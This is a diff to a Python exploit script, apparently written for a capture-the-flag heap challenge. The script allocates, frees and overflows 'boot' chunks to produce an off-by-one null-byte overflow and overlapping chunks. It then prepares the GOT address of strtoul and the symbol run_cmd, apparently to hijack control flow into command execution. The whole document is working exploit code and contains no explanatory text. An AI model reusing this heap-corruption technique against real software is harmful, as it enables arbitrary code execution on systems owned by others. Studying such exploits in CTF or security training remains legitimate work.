@@ -89,42 +89,42 @@ def stage_0_groom_the_heap(target):
 
 def stage_1_create_large_boots(target):
     #for debugging, lets read the boots here after stage
-    create_new_boot(target, 0x108, '11111')
-    create_new_boot(target, 0x228, '22222')
-    create_new_boot(target, 0x108, '33333')
+    create_new_boot(target, 0x100, 'AAAAA')
+    create_new_boot(target, 0x208, 'BBBBB')
+    create_new_boot(target, 0x100, 'CCCCC')
     print 'Stage 1: Large Boots Allocated'
     read_boot(target, 0)
 
 
 def stage_2_create_and_shrink(target):
-    delete_boot(target, 1)
+    delete_boot(target, 1) # free B
     print 'Stage 2: Hole Created'
     read_boot(target, 0)
-    edit_boot(target, 0, 0x20*'A' + p64(0x108) + p64(0x0220))
+    edit_boot(target, 0, 0x100*'A'+ p64(0x0000)) #overflow
     print 'Stage 2: Hole Overflowed'
     read_boot(target, 1)
 
 
 def stage_3_make_smaller_chunks_in_freed_block(target):
     #for debugging, lets read the boots here after stage
-    create_new_boot(target, 0x108, '44444')
-    create_new_boot(target, 0x78, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't seem to make a fastbin chunk
+    create_new_boot(target, 0x100, '11111') #B1 allocation
+    create_new_boot(target, 0x80, '22222') #B2 allocation
     print 'Stage 3: Hole Overwritten'
-    read_boot(target, 0)
+    read_boot(target, 1)
 
 
 def stage_4_free_blocks(target):
     #for debugging, lets read the boots here after stage
-    delete_boot(target, 2) #delete 4 above
-    delete_boot(target, 1) #delete last block 3 above
+    delete_boot(target, 2) #free B1
+    delete_boot(target, 1) #free C
     print 'Stage 4: Last Boots Deleted'
-    read_boot(target, 0)
+    #read_boot(target, 0)
 
 
 def stage_5_create_overlapping_object(target):
-    create_new_boot(target, 0x200, '6'*0x200)
+    create_new_boot(target, 0x210, '66666')
     print 'Stage 5: Overlapping Object Created'
-    read_boot(target, 0)
+    read_boot(target, 1)
 
     addr_strtoul    = p64(e.got['strtoul'])
     addr_runcmd     = p64(e.symbols['run_cmd'])
